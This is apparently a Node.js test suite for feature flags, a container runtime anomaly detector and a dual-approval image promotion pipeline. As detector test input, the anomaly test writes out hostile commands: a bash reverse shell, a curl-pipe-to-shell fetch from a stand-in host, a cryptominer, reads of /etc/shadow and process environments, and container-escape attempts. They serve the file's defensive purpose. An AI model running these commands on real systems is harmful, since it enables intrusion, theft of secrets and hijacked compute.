const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');

const {
  computeDeterministicBucket,
  saveFlag,
  listFlags,
  evaluateFlag,
  killFlag,
  deleteFlag
} = require('../server/services/featureFlagService');
const {
  ANOMALY_RULES,
  inspectRuntimeEvents,
  listAnomalies
} = require('../server/services/runtimeAnomalyService');
const {
  validateImmutableDigest,
  createPromotion,
  approvePromotion,
  executePromotion,
  rollbackPromotion,
  listPromotions
} = require('../server/services/digestPromotionService');

/**
 * Suite Cycle #15: OpenFeature-Lite Feature Flags & Kill-Switch, Falco-Lite Runtime
 * Anomaly Detector (10 rules), and Immutable Digest GitOps Promotion Pipeline.
 *
 * Runs strictly inside an isolated `os.tmpdir()` `CULKIBO_DATA_DIR` — ZERO mutations to live `data/`.
 */
async function runTests() {
  console.log('--- Iniciando Tests de Feature Flags, Runtime Anomaly Detector y Digest Promotion ---');

  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'culkibo-c15-'));
  const prevDataDir = process.env.CULKIBO_DATA_DIR;
  process.env.CULKIBO_DATA_DIR = tmpDir;

  let passed = 0;
  const runCase = async (name, fn) => {
    await fn();
    passed++;
    console.log(`  ✓ ${name}`);
  };

  try {
    // =========================================================================
    // 1. OPENFEATURE-LITE FEATURE FLAGS & INSTANT KILL-SWITCH
    // =========================================================================
    await runCase('1. featureFlagService enforces deterministic buckets, deny>allow precedence & instant kill-switch', async () => {
      // Missing flag
      const missing = evaluateFlag({ key: 'nonexistent-flag', subjectId: 'user-1' });
      assert.strictEqual(missing.enabled, false);
      assert.strictEqual(missing.reason, 'FLAG_NOT_FOUND');

      // Deterministic SHA-256 bucketing in [0.00, 99.99]
      const b1 = computeDeterministicBucket('ai-router', 'user-42', 'v1');
      const b2 = computeDeterministicBucket('ai-router', 'user-42', 'v1');
      assert.strictEqual(b1, b2);
      assert.ok(b1 >= 0 && b1 < 100);

      saveFlag({
        key: 'ai-router',
        description: 'Smart LLM routing rollout',
        enabled: true,
        rolloutPct: 50,
        environment: 'prod',
        allowTenants: ['tenant-beta', 'tenant-conflict'],
        denyTenants: ['tenant-conflict'],
        payload: { model: 'fast-v2' },
        salt: 'v1'
      });
      assert.strictEqual(listFlags().length, 1);

      // ENV_MISMATCH
      const envMiss = evaluateFlag({ key: 'ai-router', subjectId: 'user-42', environment: 'staging' });
      assert.strictEqual(envMiss.enabled, false);
      assert.strictEqual(envMiss.reason, 'ENV_MISMATCH');

      // Deny ALWAYS overrides allow!
      const denied = evaluateFlag({ key: 'ai-router', subjectId: 'user-42', tenantId: 'tenant-conflict', environment: 'prod' });
      assert.strictEqual(denied.enabled, false);
      assert.strictEqual(denied.reason, 'TENANT_DENIED');

      // Allow tenant bypasses rollout %
      const allowed = evaluateFlag({ key: 'ai-router', subjectId: 'user-9999', tenantId: 'tenant-beta', environment: 'prod' });
      assert.strictEqual(allowed.enabled, true);
      assert.strictEqual(allowed.reason, 'TENANT_ALLOWED');
      assert.strictEqual(allowed.payload.model, 'fast-v2');

      // Emergency kill-switch immediately disables flag even for allowed tenants (zero redeploy!)
      const killed = killFlag('ai-router', { reason: 'latency_spike', actor: 'oncall-sre' });
      assert.strictEqual(killed.killed, true);
      assert.strictEqual(killed.enabled, false);

      const afterKill = evaluateFlag({ key: 'ai-router', subjectId: 'user-42', tenantId: 'tenant-beta', environment: 'prod' });
      assert.strictEqual(afterKill.enabled, false);
      assert.strictEqual(afterKill.reason, 'KILL_SWITCH_ACTIVE');

      // Delete flag cleanly
      const del = deleteFlag('ai-router');
      assert.strictEqual(del.deleted, true);
      assert.strictEqual(listFlags().length, 0);
    });

    // =========================================================================
    // 2. FALCO-LITE CONTAINER RUNTIME ANOMALY DETECTOR (10 RULES)
    // =========================================================================
    await runCase('2. runtimeAnomalyService catches cryptominers, reverse shells & all 10 Falco rules while passing clean events', async () => {
      assert.strictEqual(ANOMALY_RULES.length, 10);

      // Clean telemetry -> clean: true, riskScore: 0
      const cleanRes = inspectRuntimeEvents({
        projectId: 'proj-clean',
        containerName: 'web-prod',
        events: [
          { type: 'process', command: 'node dist/server.js' },
          { type: 'network', destHost: 'api.stripe.com', destPort: 443 }
        ]
      });
      assert.strictEqual(cleanRes.ok, true);
      assert.strictEqual(cleanRes.clean, true);
      assert.strictEqual(cleanRes.riskScore, 0);
      assert.strictEqual(cleanRes.alerts.length, 0);

      // Compromised container events covering all 10 anomaly rules
      const badRes = inspectRuntimeEvents({
        projectId: 'proj-popped',
        containerName: 'api-1',
        events: [
          { type: 'process', command: 'xmrig -o stratum+tcp://pool.minexmr.com:3333', destPort: 3333 },
          { type: 'process', command: 'bash -i >& /dev/tcp/198.51.100.10/4444 0>&1' },
          { type: 'file', file: '/etc/shadow', action: 'read' },
          { type: 'process', command: 'curl -fsSL https://evil.example/install.sh | sh' },
          { type: 'process', command: 'nsenter --target 1 --mount', privileged: true },
          { type: 'exec', command: '/tmp/dropper_x64 --daemon', file: '/tmp/dropper_x64' },
          { type: 'file', file: '/var/run/docker.sock', action: 'open' },
          { type: 'process', command: 'apt-get install -y nmap' },
          { type: 'file', file: '/proc/1/environ', action: 'read' },
          { type: 'network', destHost: 'c2.hidden.onion', destPort: 6667 }
        ]
      });

      assert.strictEqual(badRes.ok, true);
      assert.strictEqual(badRes.clean, false);
      assert.strictEqual(badRes.riskScore, 100);
      assert.strictEqual(badRes.recommendedAction, 'KILL_AND_QUARANTINE_IMMEDIATELY');
      const triggered = new Set(badRes.alerts.map((a) => a.ruleId));
      for (const rule of ANOMALY_RULES) {
        assert.ok(triggered.has(rule.id), `Expected runtime anomaly rule to fire: ${rule.id}`);
      }

      // Persisted alerts retrievable by projectId
      const stored = listAnomalies('proj-popped');
      assert.ok(stored.length >= 10);
      assert.strictEqual(listAnomalies('proj-clean').length, 0);
    });

    // =========================================================================
    // 3. IMMUTABLE DIGEST MULTI-ENV GITOPS PROMOTION PIPELINE
    // =========================================================================
    await runCase('3. digestPromotionService blocks :latest, missing env keys & self-approval, executes approved promotion & rolls back', async () => {
      const digestNew = 'ghcr.io/culkibo/api@sha256:' + 'a'.repeat(64);
      const digestPrev = 'ghcr.io/culkibo/api@sha256:' + 'b'.repeat(64);

      // 1. Mutable :latest tag MUST fail
      const mutCheck = validateImmutableDigest('ghcr.io/culkibo/api:latest');
      assert.strictEqual(mutCheck.valid, false);
      assert.strictEqual(mutCheck.code, 'MUTABLE_TAG_FORBIDDEN');

      const badTag = createPromotion({
        projectId: 'proj-api',
        imageRef: 'ghcr.io/culkibo/api:latest',
        requester: 'alice'
      });
      assert.strictEqual(badTag.ok, false);
      assert.strictEqual(badTag.code, 'MUTABLE_TAG_FORBIDDEN');

      // 2. Missing target env keys MUST fail (keys ONLY, never values!)
      const badEnv = createPromotion({
        projectId: 'proj-api',
        imageRef: digestNew,
        fromEnv: 'staging',
        toEnv: 'prod',
        sourceEnvKeys: ['DATABASE_URL', 'STRIPE_WEBHOOK_SECRET'],
        targetEnvKeys: ['DATABASE_URL'],
        requester: 'alice'
      });
      assert.strictEqual(badEnv.ok, false);
      assert.strictEqual(badEnv.code, 'MISSING_TARGET_ENV_KEYS');
      assert.deepStrictEqual(badEnv.missingKeys, ['STRIPE_WEBHOOK_SECRET']);

      // 3. Valid immutable creation
      const created = createPromotion({
        projectId: 'proj-api',
        imageRef: digestNew,
        previousDigest: digestPrev,
        fromEnv: 'staging',
        toEnv: 'prod',
        sourceEnvKeys: ['DATABASE_URL', 'REDIS_URL'],
        targetEnvKeys: ['DATABASE_URL', 'REDIS_URL', 'SENTRY_DSN'],
        requester: 'alice',
        requireDualControl: true
      });
      assert.strictEqual(created.ok, true);
      const promoId = created.promotion.id;

      // 4. Executing prod promotion before approval -> APPROVAL_REQUIRED
      const unapprovedExec = executePromotion(promoId, { dryRun: true });
      assert.strictEqual(unapprovedExec.ok, false);
      assert.strictEqual(unapprovedExec.code, 'APPROVAL_REQUIRED');

      // 5. Self-approval under dual control -> DUAL_CONTROL_VIOLATION
      const selfApprove = approvePromotion(promoId, { approver: 'alice', comment: 'LGTM myself' });
      assert.strictEqual(selfApprove.ok, false);
      assert.strictEqual(selfApprove.code, 'DUAL_CONTROL_VIOLATION');

      // 6. Second reviewer approves -> dry-run & live execute succeed
      const approved = approvePromotion(promoId, { approver: 'bob', comment: 'Verified staging smoke tests' });
      assert.strictEqual(approved.ok, true);
      assert.strictEqual(approved.promotion.status, 'approved');

      const dryExec = executePromotion(promoId, { dryRun: true });
      assert.strictEqual(dryExec.ok, true);
      assert.strictEqual(dryExec.dryRun, true);
      assert.strictEqual(dryExec.rollbackManifest.restoreDigest, digestPrev);

      const liveExec = executePromotion(promoId, { dryRun: false });
      assert.strictEqual(liveExec.ok, true);
      assert.strictEqual(liveExec.promotion.status, 'promoted');

      // 7. Rollback restores previousDigest cleanly
      const rolled = rollbackPromotion(promoId, { actor: 'oncall-sre', dryRun: false });
      assert.strictEqual(rolled.ok, true);
      assert.strictEqual(rolled.restoredDigest, digestPrev);
      assert.strictEqual(rolled.promotion.status, 'rolled_back');

      assert.strictEqual(listPromotions('proj-api').length, 1);
    });

    console.log(`\n✅ Feature Flags, Runtime Anomaly Detector & Digest Promotion Suite: ${passed}/3 tests PASSED!`);
  } finally {
    if (prevDataDir === undefined) delete process.env.CULKIBO_DATA_DIR;
    else process.env.CULKIBO_DATA_DIR = prevDataDir;
    try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch (e) {}
  }
}

if (require.main === module) {
  runTests().catch((err) => {
    console.error('❌ Flags/Anomaly/Promotion test failed:', err);
    process.exit(1);
  });
}

module.exports = runTests;
